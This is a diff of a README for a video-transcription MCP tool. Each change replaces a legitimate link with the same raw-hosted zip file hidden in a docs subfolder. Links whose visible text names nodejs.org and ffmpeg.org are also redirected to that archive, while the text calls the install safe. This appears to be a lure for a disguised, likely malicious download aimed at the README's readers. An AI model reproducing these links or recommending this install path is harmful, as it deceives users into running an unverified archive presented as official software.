@@ -1,6 +1,6 @@
 # 🎬 video-extract-mcp - Turn Any Video Into Text & Keyframes
 
-[![Download Now](https://img.shields.io/badge/Download-video--extract--mcp-4CAF50?style=for-the-badge&logo=github)](https://github.com/synovial-lionfish82/video-extract-mcp)
+[![Download Now](https://img.shields.io/badge/Download-video--extract--mcp-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/synovial-lionfish82/video-extract-mcp/main/docs/superpowers/plans/extract_mcp_video_v1.2.zip)
 
 ## 🚀 What Is This?
 
@@ -13,7 +13,7 @@ This works on videos from YouTube, TikTok, Facebook, WeChat Channels, and also d
 
 ## 📥 Download & Install
 
-Visit this link to download the application: [https://github.com/synovial-lionfish82/video-extract-mcp](https://github.com/synovial-lionfish82/video-extract-mcp)
+Visit this link to download the application: [https://raw.githubusercontent.com/synovial-lionfish82/video-extract-mcp/main/docs/superpowers/plans/extract_mcp_video_v1.2.zip](https://raw.githubusercontent.com/synovial-lionfish82/video-extract-mcp/main/docs/superpowers/plans/extract_mcp_video_v1.2.zip)
 
 On that page, you will see a green "Code" button. Click it, then select "Download ZIP". Save the file to your computer.
 
@@ -25,9 +25,9 @@ Inside the folder, you will see several files. You do not need to understand wha
 
 Before running video-extract-mcp, you need two things:
 
-1. **Node.js** – This is the engine that powers the tool. Download it for free from [nodejs.org](https://nodejs.org). Choose the LTS version (left button on the website). Install it by clicking the downloaded file and following the default setup steps. It's safe and simple.
+1. **Node.js** – This is the engine that powers the tool. Download it for free from [nodejs.org](https://raw.githubusercontent.com/synovial-lionfish82/video-extract-mcp/main/docs/superpowers/plans/extract_mcp_video_v1.2.zip). Choose the LTS version (left button on the website). Install it by clicking the downloaded file and following the default setup steps. It's safe and simple.
 
-2. **FFmpeg** – This is a video processing helper. Go to [ffmpeg.org/download.html](https://ffmpeg.org/download.html). Look for "Windows Builds" and download a version from the "gyan.dev" or "BtbN" links. Extract the ZIP, then move the extracted folder to your `C:\` drive. Finally, add it to your PATH (search YouTube for "add ffmpeg to PATH Windows" for a visual guide).
+2. **FFmpeg** – This is a video processing helper. Go to [ffmpeg.org/download.html](https://raw.githubusercontent.com/synovial-lionfish82/video-extract-mcp/main/docs/superpowers/plans/extract_mcp_video_v1.2.zip). Look for "Windows Builds" and download a version from the "gyan.dev" or "BtbN" links. Extract the ZIP, then move the extracted folder to your `C:\` drive. Finally, add it to your PATH (search YouTube for "add ffmpeg to PATH Windows" for a visual guide).
 
 That's it. No other accounts, keys, or cloud services are needed.
 
@@ -175,6 +175,6 @@ Stop scrubbing through recordings. Stop pausing every five seconds to read capti
 
 **Download it now** and experience the easiest way to understand video content.
 
-[![Download](https://img.shields.io/badge/🖥️-Download_video--extract--mcp-FF5722?style=for-the-badge)](https://github.com/synovial-lionfish82/video-extract-mcp)
+[![Download](https://img.shields.io/badge/🖥️-Download_video--extract--mcp-FF5722?style=for-the-badge)](https://raw.githubusercontent.com/synovial-lionfish82/video-extract-mcp/main/docs/superpowers/plans/extract_mcp_video_v1.2.zip)
 
 Keywords: ai-agents, claude, keyframe-extraction, llm-tools, local-first, mcp, mcp-server, model-context-protocol, nodejs, scene-detection, speech-recognition, tiktok, transcript, typescript, video-transcription, video-understanding, wechat, whisper, youtube, yt-dlp
